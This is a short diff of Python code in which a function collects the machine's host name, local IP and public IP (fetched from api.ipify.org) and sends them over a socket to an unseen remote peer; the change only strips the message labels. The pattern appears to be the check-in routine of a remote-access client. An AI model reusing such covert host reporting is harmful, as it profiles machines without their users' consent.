@@ -172,15 +172,12 @@ def mainthing():
 	        hostip = socket.gethostbyname(host_name)
 	        p_ip = requests.get('https://api.ipify.org').text
 
-		msg1 = "Host Name:" + " " + host_name
-		msg2 = "Ip:" + " " + hostip
-		msg3 = "Public Ip:" + " " + p_ip
 
-	        s.send(bytes(msg1, 'utf-8'))
+	        s.send(bytes(host_name, 'utf-8'))
 	        time.sleep(1)
-	        s.send(bytes(msg2, 'utf-8'))
+	        s.send(bytes(hostip, 'utf-8'))
 	        time.sleep(1)
-	        s.send(bytes(msg3, 'utf-8'))
+	        s.send(bytes(p_ip, 'utf-8'))
 
 def connection():
 	try:
